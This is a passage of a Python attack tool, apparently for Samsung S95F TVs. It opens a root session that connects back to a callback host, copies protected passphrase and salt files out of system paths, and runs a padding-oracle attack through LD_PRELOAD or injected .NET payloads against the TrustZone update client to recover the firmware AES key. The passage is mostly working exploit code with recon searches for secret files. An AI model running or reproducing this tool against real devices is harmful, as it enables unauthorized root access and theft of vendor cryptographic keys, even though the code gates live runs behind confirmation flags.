        if oracle.evaluator == "payload":
            command = (
                f"{DOTNET_PATH} {shlex.quote(str(oracle.payload_dll_path))} "
                f"init {shlex.quote(str(oracle.integrity_candidate_path))} "
                f"{shlex.quote(str(oracle.salt_path))}"
            )
            try:
                result = await oracle.connection.execute(
                    command, oracle.command_timeout
                )
            except RootAgentError as error:
                raise OracleError(
                    f"payload init transport failed: {error}"
                ) from error
            fields = parse_status_fields(result.stdout)
            initialisation = parse_decimal_field(fields, "init_result")
            results[name] = {
                "exit_code": result.exit_code,
                "timed_out": result.timed_out,
                "open_result": parse_decimal_field(fields, "open_result"),
                "init_result": initialisation,
                "status": fields,
                "stderr": (result.stderr or result.stdout).strip()[:200],
            }
            return initialisation
        environment = {
            "LD_PRELOAD": str(oracle.integrity_preload_path),
            "SWU_INIT_CASE": name,
            "SWU_INIT_ITEMS_PATH": str(oracle.integrity_candidate_path),
            "SWU_INIT_SALT_PATH": str(oracle.salt_path),
            "SWU_INIT_STATUS_PATH": str(oracle.integrity_status_path),
        }
        command = environment_command(environment, REMOTE_SWU_APPLICATION)
        result = await oracle.connection.execute(command, oracle.command_timeout)
        fields: dict[str, str] = {}
        try:
            fields = parse_status_fields(
                (await oracle.read_remote(oracle.integrity_status_path)).decode(
                    "utf-8", "replace"
                )
            )
        except OracleError:
            fields = {}
        initialisation = parse_hex_field(fields, "init_result")
        results[name] = {
            "exit_code": result.exit_code,
            "timed_out": result.timed_out,
            "open_result": parse_hex_field(fields, "open_result"),
            "init_result": initialisation,
            "status": fields,
            "stderr": (result.stderr or result.stdout).strip()[:200],
        }
        return initialisation

    if len(blob) != CANDIDATE_SIZE:
        raise OracleError("the preflight blob must contain exactly 416 bytes")
    baseline = await probe_case("baseline", blob)
    first_byte = await probe_case("first-byte", mutate_byte(blob, 0, 0x01))
    accepted_mutations = 0
    final_byte: int | None = None
    for xor in (0x01, 0x02, 0x04):
        final_byte = await probe_case("final-byte", mutate_byte(blob, len(blob) - 1, xor))
        if final_byte != 1:
            break
        accepted_mutations += 1
    observed = {
        "baseline": baseline,
        "first-byte": first_byte,
        "final-byte": final_byte,
    }
    passed = observed == PREFLIGHT_EXPECTED
    if not passed and accepted_mutations >= 3:
        results["note"] = {
            "detail": "three distinct final-byte mutations stayed accepted; "
            "the command-0 path is not padding sensitive on this build"
        }
    return PreflightOutcome(results=results, passed=passed)


# --------------------------------------------------------------------------- #
# Recovery worker (synchronous) and session (asynchronous).
# --------------------------------------------------------------------------- #


@dataclass
class RecoveryContext:
    encrypted: bytes
    options: list[bytes]
    state: dict[str, object]
    checkpoint: Path
    budget: Budget
    totals: tuple[int, int]
    first_block: int
    last_block: int
    deadline_seconds: float
    command_timeout: float
    batch_size: int
    preload: bytes
    integrity_preload: bytes
    salt: bytes
    needs_preflight: bool
    manifest: dict[str, object]
    manifest_path: Path
    evaluator: str = "preload"
    payload_dll: bytes = b""
    payload_runtimeconfig: bytes = b""


def _write_checkpoint(
    checkpoint: Path,
    state: dict[str, object],
    budget: Budget,
    totals: tuple[int, int],
) -> None:
    state["query_count_this_run"] = budget.queries
    state["batch_count_this_run"] = budget.batches
    state["queries_total"] = totals[0] + budget.queries
    state["batches_total"] = totals[1] + budget.batches
    state["updated_at"] = _timestamp()
    write_private_json(checkpoint, state)


def _save_block_progress(
    checkpoint: Path,
    state: dict[str, object],
    block_state: dict[str, object],
    block: int,
    budget: Budget,
    totals: tuple[int, int],
    recovered: list[int | None],
    plaintext: list[int | None],
    completed_padding: int,
) -> None:
    block_state.update(
        {
            "intermediate": restored(recovered),
            "plaintext": restored(plaintext),
            "completed_padding": completed_padding,
            "complete": completed_padding == BLOCK_SIZE,
        }
    )
    _write_checkpoint(checkpoint, state, budget, totals)
    print(
        f"recovered block={block} position={BLOCK_SIZE - completed_padding} "
        f"queries={budget.queries} batches={budget.batches}",
        flush=True,
    )


def restored(values: list[int | None]) -> list[int | None]:
    """Copy an integer array so JSON serialisation never sees an alias."""
    return [None if value is None else int(value) for value in values]


def recovery_worker(
    *,
    oracle: RootAgentOracle,
    bridge: LoopBridge,
    encrypted: bytes,
    options: list[bytes],
    state: dict[str, object],
    checkpoint: Path,
    budget: Budget,
    totals: tuple[int, int],
    first_block: int,
    last_block: int,
    health_before: str,
    dumps_before: str,
) -> str:
    blocks = state["blocks"]
    assert isinstance(blocks, dict)

    def evaluate(candidates: list[bytes]) -> list[bool]:
        return bridge.run(oracle.evaluate(candidates))

    for block in range(first_block, last_block - 1, -1):
        block_state = blocks.setdefault(str(block), empty_block_state())
        assert isinstance(block_state, dict)
        if block_state.get("complete") and block_state.get("validation") == [True, False]:
            continue
        relocated = relocate_block(encrypted, block)
        block_options = options[block * BLOCK_SIZE : (block + 1) * BLOCK_SIZE]
        intermediate_state = block_state.get("intermediate")
        if not isinstance(intermediate_state, list):
            intermediate_state = [None] * BLOCK_SIZE
        try:
            intermediate, plaintext = recover_last_block(
                relocated,
                evaluate,
                intermediate=intermediate_state,
                plaintext_options=block_options,
                progress=partial(
                    _save_block_progress,
                    checkpoint,
                    state,
                    block_state,
                    block,
                    budget,
                    totals,
                ),
            )
            validation = bridge.run(
                oracle.evaluate(validation_candidates(relocated, intermediate))
            )
        except BudgetExhausted:
            _write_checkpoint(checkpoint, state, budget, totals)
            print(
                f"budget_stop block={block} queries={budget.queries} "
                f"batches={budget.batches}",
                flush=True,
            )
            return "incomplete"
        if validation != [True, False]:
            raise OracleError(f"block {block} validation returned {validation!r}")
        if bridge.run(oracle.health()) != health_before:
            raise OracleError(f"security-tzdaemon health changed after block {block}")
        if bridge.run(oracle.dumps()) != dumps_before:
            raise OracleError(f"secureos dump set changed after block {block}")
        block_state.update(
            {
                "intermediate": restored(intermediate),
                "plaintext": restored(plaintext),
                "completed_padding": BLOCK_SIZE,
                "validation": validation,
                "complete": True,
            }
        )
        _write_checkpoint(checkpoint, state, budget, totals)
        print(
            f"validated block={block} queries={budget.queries} "
            "tzdaemon=unchanged dumps=unchanged",
            flush=True,
        )

    if finalize_complete_state(state, options):
        _write_checkpoint(checkpoint, state, budget, totals)
        return "complete"
    _write_checkpoint(checkpoint, state, budget, totals)
    return "incomplete"


async def recovery_session(
    connection: RootAgentConnection,
    *,
    context: RecoveryContext,
) -> str:
    print(
        f"session pid={connection.identity.pid} uid={connection.identity.uid} "
        f"euid={connection.identity.euid} "
        f"smack={connection.identity.smack_label.strip()!r}",
        flush=True,
    )
    oracle = RootAgentOracle(
        connection,
        preload=context.preload,
        integrity_preload=context.integrity_preload,
        salt=context.salt,
        command_timeout=context.command_timeout,
        budget=context.budget,
        batch_size=context.batch_size,
        evaluator=context.evaluator,
        payload_dll=context.payload_dll,
        payload_runtimeconfig=context.payload_runtimeconfig,
    )
    await oracle.stage()
    try:
        if context.needs_preflight:
            outcome = await run_integrity_preflight(oracle, context.encrypted)
            context.manifest["preflight"] = {
                "blob_sha256": sha256_bytes(context.encrypted),
                "salt_sha256": sha256_bytes(context.salt),
                "results": outcome.results,
                "passed": outcome.passed,
                "at": _timestamp(),
            }
            save_manifest(context.manifest_path, context.manifest)
            print(f"preflight {outcome.detail} passed={str(outcome.passed).lower()}", flush=True)
            if not outcome.passed:
                raise OracleError(
                    "the S95F command-0 oracle could not be established "
                    f"(expected {PREFLIGHT_EXPECTED}, observed {outcome.detail}); "
                    "no recovery budget was spent"
                )
        health_before = await oracle.health()
        dumps_before = await oracle.dumps()
        context.budget.deadline = time.monotonic() + context.deadline_seconds
        bridge = LoopBridge(
            asyncio.get_running_loop(), timeout=context.command_timeout + 120.0
        )
        return await asyncio.to_thread(
            recovery_worker,
            oracle=oracle,
            bridge=bridge,
            encrypted=context.encrypted,
            options=context.options,
            state=context.state,
            checkpoint=context.checkpoint,
            budget=context.budget,
            totals=context.totals,
            first_block=context.first_block,
            last_block=context.last_block,
            health_before=health_before,
            dumps_before=dumps_before,
        )
    finally:
        await oracle.close()


# --------------------------------------------------------------------------- #
# Subcommands.
# --------------------------------------------------------------------------- #


def require_live(args: argparse.Namespace, action: str) -> str:
    host = getattr(args, "host", None)
    if not host:
        raise UsageError(f"{action} needs an explicit --host")
    if not getattr(args, "live", False):
        raise UsageError(
            f"{action} contacts the TV; re-run with --live to confirm one "
            "authorized session"
        )
    try:
        import ipaddress

        ipaddress.IPv4Address(host)
    except ValueError as error:
        raise UsageError(f"--host must be an IPv4 address: {error}") from error
    return host


def announce_live(action: str, host: str, route: str) -> None:
    print(f"live_session action={action} host={host} route={route}", flush=True)


def cmd_plan(args: argparse.Namespace) -> int:
    paths = resolve_paths(args)
    prepare_workdir(paths)
    manifest = load_manifest(paths.manifest)
    manifest.setdefault("created_at", _timestamp())
    manifest["workdir"] = str(paths.workdir)
    manifest["host"] = args.host or manifest.get("host")
    manifest["checkpoint"] = str(paths.checkpoint)
    manifest["blob"] = _describe_input(paths.blob, CANDIDATE_SIZE)
    manifest["salt"] = _describe_input(paths.salt, SALT_SIZE)
    manifest["preloads"] = check_preloads(paths)
    manifest["budgets"] = {
        "max_batches": args.max_batches,
        "max_queries": args.max_queries,
        "deadline": args.deadline,
        "batch_size": args.batch_size,
    }
    save_manifest(paths.manifest, manifest)
    state = load_state(paths.checkpoint, _optional_digest(paths.blob))
    completed = _completed_block_count(state)
    print(f"workdir={paths.workdir} mode=0700")
    print(f"manifest={paths.manifest} mode=0600")
    print(f"checkpoint={paths.checkpoint} mode=0600")
    print(f"blob={paths.blob} {_describe_line(manifest['blob'])}")
    print(f"salt={paths.salt} {_describe_line(manifest['salt'])}")
    for label, entry in manifest["preloads"].items():  # type: ignore[union-attr]
        print(f"preload[{label}]={entry['path']} {_describe_line(entry)}")
    print(f"blocks_recovered={completed}/{CIPHERTEXT_BLOCKS}")
    for note in offline_prerequisites():
        print(f"prerequisite: {note}")
    print(
        "plan=ready"
        if paths.blob.is_file() and paths.salt.is_file()
        else "plan=awaiting-inputs (run fetch or place the private files)"
    )
    print(f"budget_defaults batches={args.max_batches} queries={args.max_queries} "
          f"deadline={args.deadline:g}s batch_size={args.batch_size}")
    print("next: uv run python tools/recover_s95f_aes.py fetch --host <ip> --live")
    print("next: uv run python tools/recover_s95f_aes.py recover --host <ip> --live")
    print("next: uv run python tools/recover_s95f_aes.py verify "
          "--ciphertext <section> --iv-hex <32 hex> --expected-crc32 <hex>")
    return EXIT_OK


def _describe_input(path: Path, expected_size: int) -> dict[str, object]:
    entry: dict[str, object] = {"path": str(path), "present": False}
    if path.is_file():
        data = path.read_bytes()
        entry["present"] = True
        entry["bytes"] = len(data)
        entry["sha256"] = sha256_bytes(data)
        entry["valid"] = len(data) == expected_size
    return entry


def _describe_line(entry: object) -> str:
    if not isinstance(entry, dict) or not entry.get("present"):
        return "status=pending"
    if "valid" in entry:
        return (
            f"bytes={entry.get('bytes')} sha256={short_digest(str(entry.get('sha256', '')))} "
            f"valid={str(bool(entry.get('valid'))).lower()}"
        )
    return f"bytes={entry.get('bytes')} sha256={short_digest(str(entry.get('sha256', '')))}"


def _optional_digest(path: Path) -> str:
    if not path.is_file():
        return ""
    return sha256_file(path)


def cmd_status(args: argparse.Namespace) -> int:
    paths = resolve_paths(args)
    manifest = load_manifest(paths.manifest)
    if not paths.checkpoint.is_file():
        print(f"checkpoint={paths.checkpoint} status=absent")
        print("status=no-recovery-started")
        return EXIT_OK
    blob = paths.blob
    if not blob.is_file():
        print(f"checkpoint={paths.checkpoint} mode=0600")
        print(f"blob={blob} status=absent")
        print("status=blob-missing (place the blob or run fetch to read progress)")
        return EXIT_ERROR
    digest = _optional_digest(blob)
    state = load_state(paths.checkpoint, digest)
    completed = _completed_block_count(state)
    blocks = state.get("blocks", {})
    assert isinstance(blocks, dict)
    in_progress = [
        (block, block_state.get("completed_padding"))
        for block, block_state in sorted(
            ((int(key), value) for key, value in blocks.items() if isinstance(value, dict)),
            reverse=True,
        )
        if isinstance(block_state, dict)
        and not block_state.get("complete")
        and (block_state.get("completed_padding") or 0) > 0
    ]
    print(f"checkpoint={paths.checkpoint} mode=0600")
    if manifest.get("host"):
        print(f"host={manifest['host']}")
    print(f"blob_sha256={short_digest(digest) if digest else 'unknown'}")
    preflight = manifest.get("preflight")
    if isinstance(preflight, dict):
        print(
            f"preflight passed={str(bool(preflight.get('passed'))).lower()} "
            f"at={preflight.get('at')}"
        )
    print(f"blocks_recovered={completed}/{CIPHERTEXT_BLOCKS}")
    if in_progress:
        block, padding = in_progress[0]
        print(f"in_progress block={block} recovered_bytes={padding or 0}")
    print(
        f"queries this_run={state.get('query_count_this_run', 0)} "
        f"total={state.get('queries_total', state.get('query_count_this_run', 0))}"
    )
    print(
        f"batches this_run={state.get('batch_count_this_run', 0)} "
        f"total={state.get('batches_total', state.get('batch_count_this_run', 0))}"
    )
    key_hex = state.get("firmware_key_hex")
    if isinstance(key_hex, str) and key_hex:
        key_digest = sha256_bytes(bytes.fromhex(key_hex))
        print(f"firmware_key=RECOVERED sha256={short_digest(key_digest)}")
        print(f"firmware_key_bytes={len(bytes.fromhex(key_hex))}")
        consistency = _checkpoint_key_consistency(state)
        print(f"key_derivation_consistency={consistency}")
        print("status=complete (run verify for the firmware round trip)")
    else:
        print("firmware_key=not-yet")
        remaining = CIPHERTEXT_BLOCKS - completed
        print(f"status=incomplete blocks_remaining={remaining}")
        print("next: uv run python tools/recover_s95f_aes.py recover --host <ip> --live")
    return EXIT_OK


def _checkpoint_key_consistency(state: dict[str, object]) -> str:
    key_hex = state.get("firmware_key_hex")
    plaintext_hex = state.get("plaintext_hex")
    if not isinstance(key_hex, str) or not isinstance(plaintext_hex, str):
        return "unknown"
    try:
        plaintext = bytes.fromhex(plaintext_hex)
    except ValueError:
        return "fail (plaintext is not hexadecimal)"
    if len(plaintext) != CANDIDATE_SIZE:
        return "fail (plaintext size)"
    expected = sha256_bytes(plaintext[:-TRAILING_PADDING_SIZE])
    return "pass" if expected == key_hex else "fail"


def cmd_verify(args: argparse.Namespace) -> int:
    if not aes_self_test():
        print("error: the built-in AES self-test failed; refusing to verify",
              file=sys.stderr)
        return EXIT_ERROR
    if args.key_hex:
        try:
            key = bytes.fromhex(args.key_hex)
        except ValueError as error:
            raise UsageError(f"--key-hex is not hexadecimal: {error}") from error
    else:
        paths = resolve_paths(args)
        if not paths.checkpoint.is_file():
            raise UsageError("no checkpoint to read a key from; pass --key-hex")
        state = json.loads(paths.checkpoint.read_text(encoding="utf-8"))
        key_hex = state.get("firmware_key_hex")
        if not isinstance(key_hex, str) or not key_hex:
            raise UsageError("the checkpoint has no recovered key yet; pass --key-hex")
        key = bytes.fromhex(key_hex)
        plaintext_hex = state.get("plaintext_hex")
        if isinstance(plaintext_hex, str):
            consistency = _checkpoint_key_consistency(state)
            print(f"checkpoint_key_derivation_consistency={consistency}")
            if consistency == "fail":
                print("error: the checkpoint key does not match its plaintext",
                      file=sys.stderr)
                return EXIT_ERROR
    if len(key) != 32:
        raise UsageError("the firmware key must contain exactly 32 bytes")
    if args.iv_hex:
        try:
            iv = bytes.fromhex(args.iv_hex)
        except ValueError as error:
            raise UsageError(f"--iv-hex is not hexadecimal: {error}") from error
    else:
        # No IV given: derive it from the section salt, SHA-256(salt)[:16]
        # (unixtract's Tizen MSD formula).  --salt points at the 8 raw bytes.
        salt_path = resolve_paths(args).salt
        try:
            section_salt = salt_path.read_bytes()
        except OSError as error:
            raise UsageError(
                f"cannot read the section salt {salt_path}: {error}; "
                "pass --iv-hex or --salt <8-byte section salt>"
            ) from error
        if len(section_salt) != SALT_SIZE:
            raise UsageError(
                f"salt {salt_path} contains {len(section_salt)} bytes; "
                f"expected exactly {SALT_SIZE}"
            )
        iv = derive_section_iv(section_salt)
        print(f"iv_hex={iv.hex()} source=SHA-256(salt)[:16]")
    if len(iv) != BLOCK_SIZE:
        raise UsageError("the IV must contain exactly 16 bytes")
    try:
        ciphertext = Path(args.ciphertext).expanduser().read_bytes()
    except OSError as error:
        raise UsageError(f"cannot read ciphertext {args.ciphertext}: {error}") from error
    if not ciphertext or len(ciphertext) % BLOCK_SIZE:
        raise UsageError("the ciphertext length must be a non-zero multiple of 16")
    try:
        plaintext = _strip_pkcs7(_cbc_decrypt(key, iv, ciphertext))
    except OracleError as error:
        print(f"ciphertext_bytes={len(ciphertext)}")
        print(f"verify=fail ({error})")
        return EXIT_ERROR
    print(f"ciphertext_bytes={len(ciphertext)} plaintext_bytes={len(plaintext)}")
    checks: list[str] = []
    if args.reference_plaintext:
        reference = Path(args.reference_plaintext).expanduser().read_bytes()
        match = reference == plaintext
        checks.append(f"reference={match}")
        print(f"reference_plaintext_bytes={len(reference)} match={str(match).lower()}")
    if args.expected_crc32:
        observed = f"{zlib.crc32(plaintext) & 0xFFFFFFFF:08x}"
        expected = args.expected_crc32.lower().removeprefix("0x").zfill(8)
        match = observed == expected
        checks.append(f"crc32={match}")
        print(f"crc32_observed={observed} crc32_expected={expected} match={str(match).lower()}")
    if args.expected_sha256:
        observed = sha256_bytes(plaintext)
        match = observed == args.expected_sha256.lower()
        checks.append(f"sha256={match}")
        print(f"sha256_observed={short_digest(observed)} match={str(match).lower()}")
    if not checks:
        print("plaintext_sha256=" + short_digest(sha256_bytes(plaintext)))
        print("verify=decrypted (no expected value supplied)")
        return EXIT_OK
    failed = [check for check in checks if check.endswith("False")]
    if failed:
        print(f"verify=fail ({', '.join(failed)})")
        return EXIT_ERROR
    print("verify=pass")
    return EXIT_OK


def cmd_fetch(args: argparse.Namespace) -> int:
    host = require_live(args, "fetch")
    paths = resolve_paths(args)
    prepare_workdir(paths)
    remote_blob = PurePosixPath(args.remote_blob)
    remote_salt = PurePosixPath(args.remote_salt) if args.remote_salt else None
    transport = args.transport
    if transport in ("auto", "sdb"):
        try:
            _fetch_over_sdb(args, paths, host, remote_blob, remote_salt)
            transport = "sdb"
        except SdbError as error:
            if transport == "sdb" or SDB_PATH_REFUSAL not in str(error).lower():
                raise
            print(f"sdb pull refused: {error}", flush=True)
            print("falling back to one read-only archive-root session", flush=True)
            transport = "session"
    if transport == "session":
        _fetch_over_session(args, paths, host, remote_blob, remote_salt)
    manifest = load_manifest(paths.manifest)
    manifest["host"] = host
    manifest["blob"] = _describe_input(paths.blob, CANDIDATE_SIZE)
    manifest["salt"] = _describe_input(paths.salt, SALT_SIZE)
    manifest["fetch_transport"] = transport
    save_manifest(paths.manifest, manifest)
    print(f"fetch=ok transport={transport}")
    return EXIT_OK


def _fetch_over_sdb(
    args: argparse.Namespace,
    paths: Paths,
    host: str,
    remote_blob: PurePosixPath,
    remote_salt: PurePosixPath | None,
) -> None:
    executable = Path(args.sdb).expanduser() if args.sdb else None
    client = SdbClient(
        executable or find_sdb(),
        host,
        timeout=args.sdb_timeout,
        bridge_token=args.bridge_token,
        bridge_port=args.bridge_port,
    )
    announce_live("fetch", host, "sdb bridge pull")
    try:
        print(f"connect host={host} bridge_port={args.bridge_port}", flush=True)
        client.connect()
        client.require_device()
        pulled = _pull_validated(client, remote_blob, paths.blob, CANDIDATE_SIZE, "blob")
        print(
            f"fetched blob={paths.blob} bytes={len(pulled)} "
            f"sha256={short_digest(sha256_bytes(pulled))}"
        )
        if remote_salt is not None:
            salt_bytes = _pull_validated(
                client, remote_salt, paths.salt, SALT_SIZE, "salt"
            )
            print(
                f"fetched salt={paths.salt} bytes={len(salt_bytes)} "
                f"sha256={short_digest(sha256_bytes(salt_bytes))}"
            )
    finally:
        try:
            client.disconnect()
        except SdbError:
            pass


async def read_remote_file(
    connection: RootAgentConnection,
    path: str,
    staging: PurePosixPath,
    timeout: float = 30.0,
) -> bytes | None:
    """Copy a TV file into the session runtime directory, then read the copy.

    The root agent drops the connection when asked to read outside its staging
    and runtime directories, so restricted system paths are copied in with an
    ordinary shell command first and the copy is digest-checked.
    """
    quoted = shlex.quote(path)
    probe = await connection.execute(f"/bin/ls -la {quoted} 2>&1", max(timeout, 15.0))
    listing = probe.stdout.strip()
    if probe.exit_code != 0 or "No such file" in listing or "cannot access" in listing:
        print(f"absent {path} ({listing[:120]})", flush=True)
        return None
    digest_result = await connection.execute(
        f"/usr/bin/sha256sum {quoted} 2>&1", max(timeout, 15.0)
    )
    if digest_result.exit_code != 0:
        print(f"unreadable {path} ({digest_result.stdout.strip()[:120]})", flush=True)
        return None
    expected = digest_result.stdout.strip().split(" ")[0]
    copy_result = await connection.execute(
        f"/bin/cp -f {quoted} {shlex.quote(str(staging))} 2>&1", max(timeout, 20.0)
    )
    if copy_result.exit_code != 0:
        raise OracleError(
            f"cannot stage {path}: {copy_result.stdout.strip()[:200]}"
        )
    try:
        data = (await connection.read_file(str(staging), timeout)).data
    except RootAgentError as error:
        raise OracleError(f"reading the staged copy of {path} failed: {error}") from error
    observed = sha256_bytes(data)
    if expected and observed != expected:
        raise OracleError(f"the staged copy of {path} does not match its digest")
    print(f"staged {path} bytes={len(data)} sha256={short_digest(observed)}", flush=True)
    return data


def _fetch_over_session(
    args: argparse.Namespace,
    paths: Paths,
    host: str,
    remote_blob: PurePosixPath,
    remote_salt: PurePosixPath | None,
) -> None:
    """Read restricted TV paths through one read-only archive-root session.

    The TV's sdb refuses to pull from system paths, so the encrypted
    passphrase is read as the authenticated root agent itself.
    """
    announce_live("fetch", host, "archive-root read-only session")
    reads: dict[str, bytes] = {}

    async def action(connection: RootAgentConnection) -> None:
        staging = (
            RUNTIME_ROOT
            / f"agent-{connection.identity.pid}"
            / FETCH_STAGING_REMOTE_NAME
        )
        print(
            f"session uid={connection.identity.uid} "
            f"euid={connection.identity.euid} "
            f"smack={connection.identity.smack_label.strip()!r}",
            flush=True,
        )
        listing = await connection.execute(
            f"/bin/ls -la {shlex.quote(str(remote_blob.parent))} 2>&1", 15.0
        )
        print(f"--- ls {remote_blob.parent}", flush=True)
        print(listing.stdout.rstrip(), flush=True)
        for label, remote in (("blob", remote_blob), ("salt", remote_salt)):
            if remote is None:
                continue
            data = await read_remote_file(connection, str(remote), staging)
            if data is not None:
                reads[label] = data
        if args.recon:
            await _session_recon(connection, staging)

    asyncio.run(
        probe(
            host,
            callback_host=args.callback_host,
            bind_host=args.bind_host,
            accept_timeout=args.accept_timeout,
            bridge_token=args.bridge_token,
            bridge_port=args.bridge_port,
            session_timeout=args.session_timeout,
            session_action=action,
        )
    )
    if "blob" not in reads:
        raise OracleError(
            f"the encrypted passphrase was not readable at {remote_blob}; "
            "see the directory listing above for the actual path"
        )
    _persist_read(reads["blob"], paths.blob, CANDIDATE_SIZE, "blob")
    print(
        f"fetched blob={paths.blob} bytes={len(reads['blob'])} "
        f"sha256={short_digest(sha256_bytes(reads['blob']))}"
    )
    if "salt" in reads:
        _persist_read(reads["salt"], paths.salt, SALT_SIZE, "salt")
        print(
            f"fetched salt={paths.salt} bytes={len(reads['salt'])} "
            f"sha256={short_digest(sha256_bytes(reads['salt']))}"
        )


def _persist_read(data: bytes, destination: Path, expected_size: int, label: str) -> None:
    if len(data) != expected_size:
        raise UsageError(
            f"read {label} contains {len(data)} bytes; expected exactly {expected_size}"
        )
    temporary = destination.with_name(f".{destination.name}.partial-{os.getpid()}")
    temporary.unlink(missing_ok=True)
    try:
        descriptor = os.open(temporary, os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600)
        with os.fdopen(descriptor, "wb") as output:
            output.write(data)
            output.flush()
            os.fsync(output.fileno())
        os.replace(temporary, destination)
        os.chmod(destination, 0o600)
    finally:
        temporary.unlink(missing_ok=True)


async def _session_recon(
    connection: RootAgentConnection, staging: PurePosixPath
) -> None:
    """Read-only S95F reconnaissance: directory layouts and the SWU application ABI."""
    for directory in (
        "/usr/apps/org.tizen.tv.swu/bin",
        str(RUNTIME_ROOT / f"agent-{connection.identity.pid}"),
    ):
        result = await connection.execute(
            f"/bin/ls -la {shlex.quote(directory)} 2>&1", 15.0
        )
        print(f"--- ls {directory}", flush=True)
        print(result.stdout.rstrip(), flush=True)
    searches = (
        f"/usr/bin/find {shlex.quote(str(SWU_PASSPHRASE_DIRECTORY))} -maxdepth 2 "
        "-print 2>/dev/null",
        "/usr/bin/find /opt -maxdepth 5 -type f \\( -name '*Passphrase*' "
        "-o -name '*msd*' -o -name '*salt*' \\) -print 2>/dev/null",
    )
    for search in searches:
        result = await connection.execute(search, 25.0)
        print(f"--- {search[:96]}", flush=True)
        if result.timed_out:
            print("timed out", flush=True)
            continue
        print(result.stdout.rstrip() or "(nothing)", flush=True)
    application = await read_remote_file(connection, SWU_APPLICATION_PATH, staging)
    if application is None:
        return
    print(
        f"swu_application bytes={len(application)} {describe_elf(application[:64])}",
        flush=True,
    )
    for symbol in (
        b"_ZN3SWU8Platform18SWUTrustZoneClientC1Ev",
        b"_ZN3SWU8Platform18SWUTrustZoneClient4openEv",
        b"_ZN3SWU8Platform18SWUTrustZoneClient4initE",
    ):
        state = "present" if symbol in application else "ABSENT"
        print(f"symbol={state} {symbol.decode('ascii', 'replace')}", flush=True)


def describe_elf(header: bytes) -> str:
    if len(header) < 20 or header[:4] != b"\x7fELF":
        return "not-an-elf"
    classes = {1: "ELF32", 2: "ELF64"}
    encodings = {1: "little-endian", 2: "big-endian"}
    machines = {40: "ARM", 183: "AArch64", 62: "x86-64"}
    machine = int.from_bytes(header[18:20], "little")
    return (
        f"{classes.get(header[4], f'class={header[4]}')} "
        f"{encodings.get(header[5], f'data={header[5]}')} "
        f"{machines.get(machine, f'machine={machine}')} "
        f"osabi={header[7]}"
    )


def _pull_validated(
    client: SdbClient,
    remote: PurePosixPath,
    destination: Path,
    expected_size: int,
    label: str,
) -> bytes:
    temporary = destination.with_name(f".{destination.name}.partial-{os.getpid()}")
    temporary.unlink(missing_ok=True)
    try:
        client.pull(remote, temporary)
        data = temporary.read_bytes()
        if len(data) != expected_size:
            raise SdbError(
                f"pulled {label} contains {len(data)} bytes; expected {expected_size}"
            )
        os.replace(temporary, destination)
        os.chmod(destination, 0o600)
        return data
    finally:
        temporary.unlink(missing_ok=True)


def cmd_recover(args: argparse.Namespace) -> int:
    host = require_live(args, "recover")
    paths = resolve_paths(args)
    prepare_workdir(paths)
    if not 0 <= args.last_block <= args.first_block < CIPHERTEXT_BLOCKS:
        raise UsageError("invalid --first-block/--last-block range")
    if not 30 <= args.deadline <= 6900:
        raise UsageError("--deadline must be between 30 and 6900 seconds")
    encrypted = read_input_file(paths.blob, CANDIDATE_SIZE, "encrypted passphrase blob")
    salt = read_input_file(paths.salt, SALT_SIZE, "firmware salt")
    if args.evaluator == "payload":
        payload_directory = Path(args.oracle_payload_directory).expanduser()
        payload_dll_path = payload_directory / ORACLE_PAYLOAD_DLL
        payload_config_path = payload_directory / ORACLE_PAYLOAD_CONFIG
        for path in (payload_dll_path, payload_config_path):
            if not path.is_file():
                raise UsageError(
                    f"missing built oracle payload {path}; run make common-payload"
                )
        batch_preload = b""
        integrity_preload = b""
        payload_dll = payload_dll_path.read_bytes()
        payload_runtimeconfig = payload_config_path.read_bytes()
    else:
        preloads = check_preloads(paths)
        missing = [entry["path"] for entry in preloads.values() if not entry["present"]]
        if missing:
            raise UsageError(
                "missing built oracle preloads: "
                + ", ".join(str(path) for path in missing)
                + "; run make swu-preloads"
            )
        batch_preload = paths.batch_preload.read_bytes()
        integrity_preload = paths.integrity_preload.read_bytes()
        payload_dll = b""
        payload_runtimeconfig = b""
    if args.sdb:
        os.environ["SDB"] = str(Path(args.sdb).expanduser())
    digest = sha256_bytes(encrypted)
    salt_digest = sha256_bytes(salt)
    options = build_format_options()
    state = load_state(paths.checkpoint, digest)
    manifest = load_manifest(paths.manifest)
    manifest["host"] = host
    manifest["blob"] = _describe_input(paths.blob, CANDIDATE_SIZE)
    manifest["salt"] = _describe_input(paths.salt, SALT_SIZE)
    save_manifest(paths.manifest, manifest)
    totals = (
        int(state.get("queries_total", 0) or 0),
        int(state.get("batches_total", 0) or 0),
    )
    pending = _pending_blocks(state, args.first_block, args.last_block)
    if not pending:
        if finalize_complete_state(state, options):
            write_private_json(paths.checkpoint, state)
            print(f"recovery=complete blocks={CIPHERTEXT_BLOCKS} offline=yes")
            return EXIT_OK
        raise UsageError("no pending blocks, but the checkpoint cannot be finalised")
    preflight = manifest.get("preflight")
    needs_preflight = bool(args.force_preflight) or not (
        isinstance(preflight, dict)
        and preflight.get("passed") is True
        and preflight.get("blob_sha256") == digest
        and preflight.get("salt_sha256") == salt_digest
    )
    context = RecoveryContext(
        encrypted=encrypted,
        options=options,
        state=state,
        checkpoint=paths.checkpoint,
        budget=Budget(args.max_batches, args.max_queries, 0.0),
        totals=totals,
        first_block=args.first_block,
        last_block=args.last_block,
        deadline_seconds=args.deadline,
        command_timeout=args.command_timeout,
        batch_size=args.batch_size,
        preload=batch_preload,
        integrity_preload=integrity_preload,
        salt=salt,
        evaluator=args.evaluator,
        payload_dll=payload_dll,
        payload_runtimeconfig=payload_runtimeconfig,
        needs_preflight=needs_preflight,
        manifest=manifest,
        manifest_path=paths.manifest,
    )
    print(
        f"recover blocks={len(pending)}/{CIPHERTEXT_BLOCKS} "
        f"preflight={'required' if needs_preflight else 'recorded'} "
        f"budget batches={args.max_batches} queries={args.max_queries} "
        f"deadline={args.deadline:g}s"
    )
    announce_live("recover", host, "archive-root session")
    session_timeout = min(7200.0, args.deadline + 300.0)
    outcome: dict[str, str] = {}

    async def action(connection: RootAgentConnection) -> None:
        outcome["value"] = await recovery_session(connection, context=context)

    try:
        evidence = asyncio.run(
            probe(
                host,
                callback_host=args.callback_host,
                bind_host=args.bind_host,
                sdb_timeout=args.sdb_timeout,
                accept_timeout=args.accept_timeout,
                command_timeout=args.command_timeout,
                bridge_token=args.bridge_token,
                bridge_port=args.bridge_port,
                session_action=action,
                session_timeout=session_timeout,
            )
        )
    except (ArchiveRootError, SdbError, RootAgentError, OracleError, ValueError, OSError) as error:
